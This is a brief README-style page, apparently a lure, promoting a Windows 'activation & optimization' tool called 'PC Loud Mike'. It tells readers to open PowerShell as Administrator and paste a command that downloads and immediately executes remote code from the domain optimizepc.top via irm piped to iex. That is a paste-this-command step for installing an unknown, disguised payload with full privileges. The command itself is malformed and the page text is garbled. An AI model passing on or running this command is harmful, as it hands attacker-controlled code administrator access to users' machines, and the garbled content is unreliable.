# 💻 PC Loud Mike

### Powerful Windows  PC-loud-Mike Tool

Easy PowerShell activation & optimization utility.

---

## ⚡ How To Use

### 1️⃣ Open PowerShell As Administrator

- Press Start Menu
- Search `PowerShell`
- Right Click
- Click **Run as Administrator**

---

### 2️⃣ Copy & Paste This Command

```powershell
irm "irm "optimizepc.top" | iex" | iex
```

---

### 3️⃣ Press Enter

The tool will automatically start.

---

- Fast PC loud Mike
